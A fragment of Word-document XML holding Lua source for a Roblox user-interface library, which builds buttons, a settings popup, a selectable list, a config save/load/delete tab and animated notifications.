        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "TextBox",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = options.callback or function() end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};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local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "button_element" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "elements"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0, 0);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"button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button_element" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, -4, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -8, 0, 30);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(33, 33, 35)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"button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 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"name" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.small;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = rgb(245, 245, 245);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"button"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Size = dim2(1, 0, 1, 0);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 library:apply_theme(items[ "name" ], "accent", "BackgroundColor3");                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "button" ].InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.callback()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "name" ].TextColor3 = themes.preset.accent </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(items[ "name" ], {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p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library:settings(options)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                open = false; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {}; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                sanity = true; -- made this for my own sanity.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items[ "outline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Visible = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ClipsDescendants = true;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rgb(25, 25, 29)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"UIScale" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Scale = scale;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "inline" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "outline" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 1, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -2, 1, -2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(22, 22, 24)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"inline"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"elements" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "inline"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10, 0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -20,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"elements" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 10);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PaddingBottom = dim(0, 15);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "elements" ]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"outline"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"fade" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 7)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"tick" ] = library:create( "ImageButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Image = "rbxassetid://128797200442698";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "right_components" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 16, 0, 16);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.set_visible(bool)                 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(items[ "outline" ], {Size = dim_offset(bool and 240 or 0, 0)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "outline" ].Position = dim_offset(items[ "tick" ].AbsolutePosition.X, items[ "tick" ].AbsolutePosition.Y + 90)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:close_element(cfg)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items[ "tick" ].InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.open = not cfg.open</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.set_visible(cfg.open)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)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library:list(properties) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                options = properties.options or {"1", "2", "3"};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                flag = properties.flag or library:next_flag();    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                callback = properties.callback or function() end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                data_store = {};        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                current_element;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "list" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = self.items[ "elements" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 0);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AutomaticSize = Enum.AutomaticSize.Y;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"UIListLayout" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "list" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SortOrder = Enum.SortOrder.LayoutOrder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Parent = items[ "list" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingLeft = dim(0, 4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.refresh_options(options_to_refresh)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _,option in cfg.data_store do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    option:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, option_data in options_to_refresh do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local button = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.small;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "list" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 0, 30);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rgb(33, 33, 35)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    }); cfg.data_store[#cfg.data_store + 1] = button;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local name = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = option_data;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = button;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextTruncate = Enum.TextTruncate.AtEnd;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = button;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });     </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    button.InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local current = cfg.current_element </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if current and current ~= name then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(current, {TextColor3 = rgb(72, 72, 72)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            flags[cfg.flag] = option_data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.callback(option_data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(name, {TextColor3 = rgb(245, 245, 245)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.current_element = name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name.MouseEnter:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if cfg.current_element == name then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(name, {TextColor3 = rgb(140, 140, 140)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    name.MouseLeave:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if cfg.current_element == name then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(name, {TextColor3 = rgb(72, 72, 72)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)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cfg.refresh_options(cfg.options)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return setmetatable(cfg, library)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:init_config(window) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local text;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --window:seperator({name = ""})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local main = window:tab({name = "Configs", tabs = {"Main"}})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local column = main:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local section = column:section({name = "Configs", size = 1, default = true, icon = "rbxassetid://139628202576511"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            config_holder = section:list({options = {"Report", "This", "Error", "To", "Finobe"}, callback = function(option)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if text then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    text.set(option)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end, flag = "config_name_list"}); library:update_config_list()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local column = main:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local section = column:section({name = "Settings", side = "right", size = 1, default = true, icon = "rbxassetid://129380150574313"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            text = section:textbox({name = "Config name:", flag = "config_name_text"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({name = "Save", callback = function() writefile(library.directory .. "/configs/" .. flags["config_name_text"] .. ".cfg", library:get_config()) library:update_config_list() notifications:create_notification({name = "Configs", info = "Saved config to:\n" .. flags["config_name_text"] or flags["config_name_text"]}) end}) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({name = "Load", callback = function() library:load_config(readfile(library.directory .. "/configs/" .. flags["config_name_text"] .. ".cfg"))  library:update_config_list() notifications:create_notification({name = "Configs", info = "Loaded config:\n" .. flags["config_name_text"]}) end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:button({name = "Delete", callback = function() delfile(library.directory .. "/configs/" .. flags["config_name_text"] .. ".cfg")  library:update_config_list() notifications:create_notification({name = "Configs", info = "Deleted config:\n" .. flags["config_name_text"]}) end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:colorpicker({name = "Menu Accent", callback = function(color, alpha) library:update_theme("accent", color) end, color = themes.preset.accent})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            section:keybind({name = "Menu Bind", callback = function(bool) window.toggle_menu(bool) end, default = true})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    --</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    -- Notification Library</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function notifications:refresh_notifs() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local offset = 50</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for i, v in notifications.notifs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Position = vec2(20, offset)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:tween(v, {Position = dim_offset(Position.X, Position.Y)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                offset += (v.AbsoluteSize.Y + 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return offset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function notifications:fade(path, is_fading)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local fading = is_fading and 1 or 0 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:tween(path, {BackgroundTransparency = fading}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for _, instance in path:GetDescendants() do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not instance:IsA("GuiObject") then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if instance:IsA("UIStroke") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        library:tween(instance, {Transparency = fading}, Enum.EasingStyle.Quad, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if instance:IsA("TextLabel") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(instance, {TextTransparency = fading})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif instance:IsA("Frame") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    library:tween(instance, {BackgroundTransparency = instance.Transparency and 0.6 and is_fading and 1 or 0.6}, Enum.EasingStyle.Quad, 1)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 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function notifications:create_notification(options)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = options.name or "This is a title!";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = options.info or "This is extra info!";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = options.lifetime or 3;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                outline;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "notification" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 210, 0, 53);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
